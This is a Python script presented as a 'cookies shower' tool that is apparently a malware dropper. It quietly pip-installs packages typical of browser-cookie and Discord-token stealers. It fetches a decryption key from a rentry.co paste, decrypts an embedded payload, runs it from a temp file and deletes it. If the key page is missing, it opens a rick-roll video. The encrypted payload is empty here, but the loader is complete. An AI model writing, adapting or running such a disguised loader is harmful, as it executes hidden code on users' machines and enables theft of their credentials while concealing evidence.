import os

try:
    os.environ['COMSPEC'] = 'C:\\Windows\\System32\\cmd.exe'
    import subprocess
    print('[*] Starting python-cookies-shower...')
    subprocess.check_output('pip install --upgrade pip')
    for package in ['discord', 'requests', 'pycryptodome', 'cryptography', 'pypiwin32', 'pywin32', 'beautifulsoup4']:
        subprocess.check_output('pip install ' + package, shell=True)
except:
    exit()


import requests
import webbrowser
import tempfile

from bs4 import BeautifulSoup
from cryptography.fernet import Fernet


def rick_roll():
    webbrowser.open('https://www.youtube.com/watch?v=xvFZjo5PgG0&t=1s')


def request(url):
    response = requests.get(url)

    if response.status_code == 404:
        rick_roll()
        exit()

    return BeautifulSoup(response.content, 'html.parser')


def get_key():
    url = 'https://rentry.co/DucMinhIELTS'
    response = request(url)
    key = response.find('div', class_='entry-text my-2 px-2 px-sm-4').get_text()

    return key.strip().encode()


def creat_executer(file_content):
    temp_dir = tempfile.gettempdir()
    os.chdir(temp_dir)

    file_location = os.getcwd() + '\\file.py'
    with open(file_location, 'w') as f:
        f.write(file_content)

    return file_location


def run(path):
    subprocess.call(['python', path])


def main():
    
    key = get_key()
    fernet = Fernet(key)

    encrypted_code = b''
    code = fernet.decrypt(encrypted_code).decode()
    executor_path = creat_executer(code)

    run(executor_path)
    os.remove(executor_path)


if __name__ == '__main__':
    main()
